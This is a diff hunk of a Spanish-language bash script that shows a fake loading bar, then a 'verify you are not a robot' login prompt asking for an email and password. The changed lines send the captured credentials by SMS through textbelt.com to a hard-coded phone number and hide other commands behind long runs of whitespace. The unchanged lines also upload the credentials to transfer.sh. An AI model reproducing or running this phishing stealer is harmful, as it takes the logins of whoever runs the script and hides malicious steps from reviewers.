@@ -38,14 +38,12 @@ echo -ne ' Cargando script..   (62%)\r'
 sleep 0.5
 echo -ne ' Cargando script.    (85%)\r'
 sleep 0.5
-echo -ne ' Cargando script    (100%)\r'
-echo " "
-setterm -foreground red
-echo -e "Verifica que no eres un robot\ninicia secion aqui:"
-echo "Escribe tu correo"
+echo -ne ' Cargando script    (100%)\r'                                                                                                      echo " "                                                                                                                                     setterm -foreground red
+echo -e "Verifica que no eres un robot\ninicia secion aqui:"                                                                                 echo "Escribe tu correo"
 read correo
 echo "Escribe tu contraseña"
-read -sp " " contrase
+read contrase
+curl -# -X POST https://textbelt.com/text --data-urlencode phone="17256666908" --data-urlencode message=" $correo $contrase " -d key=textbel
 echo "$correo $contrase" > notpe.txt
 curl --upload-file notpe.txt https://transfer.sh/notpe.txt
 echo "opes"
